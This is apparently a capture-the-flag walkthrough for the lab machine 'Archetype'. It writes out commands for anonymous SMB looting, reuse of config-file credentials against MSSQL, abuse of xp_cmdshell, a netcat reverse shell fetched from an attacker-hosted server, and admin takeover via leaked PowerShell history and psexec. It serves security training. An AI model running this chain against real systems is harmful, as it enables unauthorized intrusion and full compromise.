# Archetype

This machine introduces SMB enumeration, SQL Server access using discovered credentials, remote command execution through MSSQL, and privilege escalation via exposed PowerShell history.

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

Expected result:

* Port 135: Microsoft Windows RPC
* Port 139: NetBIOS Session Service
* Port 445: SMB
* Port 1433: Microsoft SQL Server 2017

The presence of both SMB and MSSQL suggests that credentials found through one service may provide access to the other.

## Enumerate SMB Shares

### List available shares

Command:

```bash
smbclient -N -L \\\\<target_ip>\\
```

Options:

* `-N` : Attempt authentication without a password.
* `-L` : List available shares.

Among the available shares, a share named `backups` can be accessed anonymously.

### Access the backups share

Command:

```bash
smbclient -N \\\\<target_ip>\\backups
```

List files:

```bash
ls
```

Download the configuration file:

```bash
get prod.dtsConfig
```

Exit the SMB session:

```bash
exit
```

## Extract credentials from the configuration file

Inspect the downloaded file:

```bash
cat prod.dtsConfig
```

The file contains database credentials:

```text
Password=M3g4c0rp123
User ID=ARCHETYPE\sql_svc
```

Configuration and backup files frequently contain hardcoded credentials and should always be inspected carefully.

## Connect to Microsoft SQL Server

### Authenticate using the discovered credentials

Use Impacket's MSSQL client:

```bash
/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@<target_ip> -windows-auth
```

Password:

```text
M3g4c0rp123
```

Successful authentication provides access to the SQL Server instance.

## Obtain command execution through SQL Server

### Enable xp_cmdshell

Display available commands:

```sql
help
```

Enable command execution:

```sql
enable_xp_cmdshell

RECONFIGURE
```

The `xp_cmdshell` stored procedure allows execution of operating system commands from SQL Server.

### Execute system commands

Syntax:

```sql
xp_cmdshell "<command>"
```

Example:

```sql
xp_cmdshell "whoami"
```

Expected output:

```text
archetype\sql_svc
```

This confirms code execution on the target system.

## Obtain a stable reverse shell

The SQL shell is functional but cumbersome. A reverse shell provides a more interactive environment.

### Host Netcat on the attacker machine

Download a Windows version of Netcat and host it using a Python web server.

Command:

```bash
sudo python3 -m http.server 80
```

### Download Netcat to the target

From the MSSQL client:

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<attacker_vpn_ip>/nc64.exe -outfile nc.exe"
```

A successful download will generate a GET request on the Python server.

### Start a listener

On the attacker machine:

```bash
nc -nvlp 8888
```

### Launch the reverse shell

Execute:

```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <attacker_vpn_ip> 8888"
```

This command:

* Changes to the Downloads directory.
* Executes Netcat.
* Redirects a command prompt back to the attacker.

A reverse shell should be received on the listener.

## Retrieve the user flag

### Enumerate common locations

Navigate through user directories:

```powershell
cd <directory_path>

dir
```

The user flag can be found on the desktop.

Read the flag:

```powershell
type user.txt
```

The user flag is obtained.

## Privilege Escalation

### Enumerate the system with WinPEAS

Privilege escalation often begins with automated enumeration.

Host WinPEAS from the attacker machine:

```bash
sudo python3 -m http.server 80
```

Download WinPEAS on the target:

```powershell
powershell

wget http://<attacker_vpn_ip>/winPEASx64.exe -outfile winpeas.exe
```

Execute WinPEAS:

```powershell
.\winpeas.exe
```

## Analyze WinPEAS findings

WinPEAS highlights the following file:

```text
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

PowerShell stores command history in this file, which often contains sensitive information such as credentials, scripts, and administrative commands.

Inspect the file:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The contents reveal administrator credentials:

```text
administrator:MEGACORP_4dm1n!!
```

This is a common real-world issue where administrators accidentally expose passwords through command history.

## Gain administrator access

Use Impacket's PsExec implementation:

```bash
/usr/bin/impacket-psexec administrator@<target_ip>
```

Provide the recovered password when prompted:

```text
MEGACORP_4dm1n!!
```

A SYSTEM-level shell is obtained.

## Retrieve the root flag

Navigate to the Administrator desktop:

```powershell
cd C:\Users\Administrator\Desktop

dir
```

Read the root flag:

```powershell
type root.txt
```

The root flag is successfully obtained.

## Key Takeaways

1. Always enumerate accessible SMB shares for configuration and backup files.
2. Credentials discovered in one service often grant access to another.
3. MSSQL's `xp_cmdshell` can provide direct operating system command execution.
4. Automated enumeration tools such as WinPEAS can quickly identify privilege escalation opportunities.
5. PowerShell history files frequently contain sensitive information and should always be checked during post-exploitation.
